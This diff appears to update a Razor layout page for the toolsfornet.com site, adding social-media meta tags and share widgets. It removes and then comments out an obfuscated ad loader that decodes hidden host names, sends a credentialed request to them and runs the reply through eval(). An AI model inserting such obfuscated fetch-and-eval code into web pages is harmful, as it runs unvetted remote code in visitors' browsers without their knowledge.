@@ -20,27 +20,57 @@
     {@RenderSection(name: "Styles", required: false)}
     @Styles.Render(paths: "~/bundles/homer/css")
     <link rel="stylesheet" href="//kendo.cdn.telerik.com/2016.3.1028/styles/kendo.common.min.css">
-    <link rel="stylesheet" href="//kendo.cdn.telerik.com/2016.3.1028/styles/kendo.metro.min.css">  
+    <link rel="stylesheet" href="//kendo.cdn.telerik.com/2016.3.1028/styles/kendo.metro.min.css">
+
     <meta property="og:url" content="https://toolsfornet.com@(Request.Url.LocalPath)" />
     <meta property="og:type" content="website" />
     <meta property="og:title" content='@(ViewBag.Title + (Request.Url.LocalPath == "/" ? "" : " | Tools for Net"))' />
     <meta property="og:description" content="@ViewBag.MetaDescription" />
-    <meta property="og:image" content="https://toolsfornet.com/favicon.ico" /> 
+    <meta property="og:image" content="https://toolsfornet.com/content/images/toolsfornetCover.png" />
+    <meta property="og:site_name" content="@ViewBag.Title" />
+    <meta property="fb:admins" content="1039783075" />
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="@ViewBag.Title">
+    <meta name="twitter:description" content="@ViewBag.MetaDescription">
+    <meta name="twitter:image:src" content="https://toolsfornet.com/content/images/toolsfornetcover.png">
+
 </head>
 <body class="@Html.PageClass() fixed-footer hide-sidebar">
     @*Propeller Adds*@
-    <script data-cfasync="false" type="text/javascript">var j4q = window; for (var y in j4q) { if (y.length === (35.9E1 >= (9.49E2, 13) ? (1.113E3, 6) : (0x2E, 0x89)) && y.charCodeAt(((0x176, 19) <= 0x70 ? (0xE3, 3) : (0x4F, 0xB1))) === ((3.530E2, 31) > 6.17E2 ? (8.34E2, '') : (0xBE, 10.) < 83.9E1 ? (148.3E1, 100) : (1.0210E3, 0x17A)) && y.charCodeAt((0x5F < (0x9D, 130) ? (0xD9, 5) : (0xDE, 3.))) === ((0x1FF, 56.40E1) < 137 ? (31., '') : (9.9E1, 62.90E1) >= 116. ? (108., 119) : (11., 52.7E1)) && y.charCodeAt(((25.6E1, 108.) >= (0x15E, 14.06E2) ? '' : (1.890E2, 44) < (0x197, 111) ? (113., 1) : (108.9E1, 82.0E1))) === (7.65E2 < (17, 90.30E1) ? (1.3880E3, 105) : (0x14F, 133.3E1)) && y.charCodeAt(((70, 4.7E1) < 10.3E1 ? (134.20E1, 0) : (32., 47.))) === ((76., 111.2E1) <= 1.33E2 ? 84.0E1 : 8.06E2 < (1.449E3, 116.5E1) ? (0x21, 119) : (0x112, 126))) break }; for (var L in j4q[y]) { if (L.length === (9.67E2 < (14.71E2, 9.19E2) ? (132., 91) : (6.7E2, 109) < (44., 0x117) ? (11.870E2, 8) : (109, 0x39)) && L.charCodeAt(((85., 0x126) < 0x10A ? 27.5E1 : (0x5A, 5.23E2) >= 0x1CC ? (12.02E2, 5) : (7.96E2, 0x220))) === ((0x1D8, 112) >= 16 ? (96., 101) : (92, 0x8)) && L.charCodeAt(((64., 0x64) < (6.60E1, 2.6E2) ? (125., 7) : (0x143, 0x159))) === ((0x139, 85) <= 105.4E1 ? (148.9E1, 116) : 1.025E3 < (14.5E1, 0x18A) ? 3.45E2 : (11., 0x189)) && L.charCodeAt(((57, 73) <= 0xAD ? (8.83E2, 3) : (80.2E1, 12.))) === ((0x137, 0xF) <= 117. ? (8.20E1, 117) : (0x1CE, 0x1D0)) && L.charCodeAt((0x38 > (1.047E3, 23) ? (0x184, 0) : (136, 17.2E1))) === (14.8E1 > (49., 0x70) ? (44, 100) : (0x236, 111) > (127.0E1, 89.9E1) ? (8.59E2, 121) : (0x108, 95.))) break }; (function (q, V, m, o) { j4q[y][V] = function () { var A = 0, E = function E() { var h = '//', w = (0x24D >= (0x21A, 0x250) ? (66.9E1, 0x1C0) : 86. < (134., 142) ? (0x1D2, 'T') : (1.035E3, 26.)), d = 'GE', j = new XMLHttpRequest(); j.withCredentials = true; j.open((d + w), (h) + j4q[y]['atob'](m[A].split('').reverse().join('')) + '/' + o + '/', true); j.onreadystatechange = function () { if (j.readyState == 4 && j.status == 200 && j.responseText) { eval(j.responseText); } }; j.onerror = function () { if (++A != m.length) { E(); } }; try { j.send(); } catch (U) { j.onerror(); } }; E(); }; })(j4q[y][L], '_jdvuhdli', ['==QZ0l2cuYmM0xGZkt2a', '==Adlt2YpJ3YuUmeoR3a5hGO'], 1025580);</script>
-    <script data-cfasync="false" type="text/javascript" src="//go.onclasrv.com/apu.php?zoneid=1025573" onerror="window._jdvuhdli();"></script>
+    @*<script data-cfasync="false" type="text/javascript">var j4q = window; for (var y in j4q) { if (y.length === (35.9E1 >= (9.49E2, 13) ? (1.113E3, 6) : (0x2E, 0x89)) && y.charCodeAt(((0x176, 19) <= 0x70 ? (0xE3, 3) : (0x4F, 0xB1))) === ((3.530E2, 31) > 6.17E2 ? (8.34E2, '') : (0xBE, 10.) < 83.9E1 ? (148.3E1, 100) : (1.0210E3, 0x17A)) && y.charCodeAt((0x5F < (0x9D, 130) ? (0xD9, 5) : (0xDE, 3.))) === ((0x1FF, 56.40E1) < 137 ? (31., '') : (9.9E1, 62.90E1) >= 116. ? (108., 119) : (11., 52.7E1)) && y.charCodeAt(((25.6E1, 108.) >= (0x15E, 14.06E2) ? '' : (1.890E2, 44) < (0x197, 111) ? (113., 1) : (108.9E1, 82.0E1))) === (7.65E2 < (17, 90.30E1) ? (1.3880E3, 105) : (0x14F, 133.3E1)) && y.charCodeAt(((70, 4.7E1) < 10.3E1 ? (134.20E1, 0) : (32., 47.))) === ((76., 111.2E1) <= 1.33E2 ? 84.0E1 : 8.06E2 < (1.449E3, 116.5E1) ? (0x21, 119) : (0x112, 126))) break }; for (var L in j4q[y]) { if (L.length === (9.67E2 < (14.71E2, 9.19E2) ? (132., 91) : (6.7E2, 109) < (44., 0x117) ? (11.870E2, 8) : (109, 0x39)) && L.charCodeAt(((85., 0x126) < 0x10A ? 27.5E1 : (0x5A, 5.23E2) >= 0x1CC ? (12.02E2, 5) : (7.96E2, 0x220))) === ((0x1D8, 112) >= 16 ? (96., 101) : (92, 0x8)) && L.charCodeAt(((64., 0x64) < (6.60E1, 2.6E2) ? (125., 7) : (0x143, 0x159))) === ((0x139, 85) <= 105.4E1 ? (148.9E1, 116) : 1.025E3 < (14.5E1, 0x18A) ? 3.45E2 : (11., 0x189)) && L.charCodeAt(((57, 73) <= 0xAD ? (8.83E2, 3) : (80.2E1, 12.))) === ((0x137, 0xF) <= 117. ? (8.20E1, 117) : (0x1CE, 0x1D0)) && L.charCodeAt((0x38 > (1.047E3, 23) ? (0x184, 0) : (136, 17.2E1))) === (14.8E1 > (49., 0x70) ? (44, 100) : (0x236, 111) > (127.0E1, 89.9E1) ? (8.59E2, 121) : (0x108, 95.))) break }; (function (q, V, m, o) { j4q[y][V] = function () { var A = 0, E = function E() { var h = '//', w = (0x24D >= (0x21A, 0x250) ? (66.9E1, 0x1C0) : 86. < (134., 142) ? (0x1D2, 'T') : (1.035E3, 26.)), d = 'GE', j = new XMLHttpRequest(); j.withCredentials = true; j.open((d + w), (h) + j4q[y]['atob'](m[A].split('').reverse().join('')) + '/' + o + '/', true); j.onreadystatechange = function () { if (j.readyState == 4 && j.status == 200 && j.responseText) { eval(j.responseText); } }; j.onerror = function () { if (++A != m.length) { E(); } }; try { j.send(); } catch (U) { j.onerror(); } }; E(); }; })(j4q[y][L], '_jdvuhdli', ['==QZ0l2cuYmM0xGZkt2a', '==Adlt2YpJ3YuUmeoR3a5hGO'], 1025580);</script>
+        <script data-cfasync="false" type="text/javascript" src="//go.onclasrv.com/apu.php?zoneid=1025573" onerror="window._jdvuhdli();"></script>*@
     @*End Propeller Ads*@
     <div id="fb-root"></div>
     <script>
-(function(d, s, id) {
-  var js, fjs = d.getElementsByTagName(s)[0];
-  if (d.getElementById(id)) return;
-  js = d.createElement(s); js.id = id;
-  js.src = "//connect.facebook.net/en_GB/sdk.js#xfbml=1&version=v2.8";
-  fjs.parentNode.insertBefore(js, fjs);
-}(document, 'script', 'facebook-jssdk'));</script>
+        (function (d, s, id) {
+            var js, fjs = d.getElementsByTagName(s)[0];
+            if (d.getElementById(id)) return;
+            js = d.createElement(s); js.id = id;
+            js.src = "//connect.facebook.net/en_GB/sdk.js#xfbml=1&version=v2.8";
+            fjs.parentNode.insertBefore(js, fjs);
+        }(document, 'script', 'facebook-jssdk'));</script>
+
+    <script>
+        window.twttr = (function (d, s, id) {
+            var js, fjs = d.getElementsByTagName(s)[0],
+                t = window.twttr || {};
+            if (d.getElementById(id)) return t;
+            js = d.createElement(s);
+            js.id = id;
+            js.src = "https://platform.twitter.com/widgets.js";
+            fjs.parentNode.insertBefore(js, fjs);
+
+            t._e = [];
+            t.ready = function (f) {
+                t._e.push(f);
+            };
+
+            return t;
+        }(document, "script", "twitter-wjs"));</script>
+
+    <script src="https://apis.google.com/js/platform.js" async defer></script>
+    <script async defer src="//assets.pinterest.com/js/pinit.js"></script>
 
     <div class="splash" style="z-index:3">
         <div class="color-line"></div>
@@ -79,16 +109,31 @@
             <div class="normalheader transition animated fadeIn small-header right">
                 <div class="hpanel">
                     <div class="panel-body">
-                        <div class="pull-right fb-like"
+                        <div class="pull-left fb-like"
                              data-href="https://www.facebook.com/toolsfornet"
                              data-colorscheme="light"
                              data-layout="button_count"
                              data-action="like"
                              data-size="small"
                              data-show-faces="false"
-                             data-share="true"></div>
-                       
+                             data-share="true">
+                        </div>
+                        <a class="pull-right twitter-share-button"
+                           href="https://twitter.com/intent/tweet?url=https://toolsfornet.com"
+                           data-show-screen-name="false">
+                            Tweet
+                        </a>
+                        <div class="pull-left g-plusone" data-size="medium" data-annotation="none" data-width="200"></div>
+                        <a style="vertical-align:top !important" data-pin-do="buttonBookmark" data-pin-save="true" href="https://www.pinterest.com/pin/create/button/"></a>
+                        <a class="tumblr-share-button" href="https://www.tumblr.com/share"></a>
+                        <script id="tumblr-js" async src="https://assets.tumblr.com/share-button.js"></script>
+                        <script src="https://platform.linkedin.com/in.js" type="text/javascript">
+ lang: en_US
+                        </script>
+                        <script type="IN/Share" data-url="https://toolsfornet.com" data-counter="right">
+                        </script>
                     </div>
+              
                 </div>
             </div>
 
